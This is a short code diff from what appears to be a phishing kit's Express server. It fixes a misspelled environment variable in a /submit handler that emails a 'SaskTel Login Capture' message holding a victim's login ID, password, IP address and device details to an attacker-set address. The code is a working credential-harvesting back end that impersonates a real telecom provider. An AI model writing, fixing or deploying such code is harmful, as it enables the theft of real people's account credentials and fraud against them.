@@ -22,7 +22,7 @@ app.post('/submit', async (req, res) => {
 
   const mailOptions = {
     from: process.env.GMAIL_USER,
-    to: process.env.RECEPIENT_EMAIL,
+    to: process.env.RECIPIENT_EMAIL,
     subject: 'SaskTel Login Capture',
     text: `Login ID: ${loginID}\nPassword: ${password}\nIP: ${ip}\nDevice: ${deviceInfo}`
   };
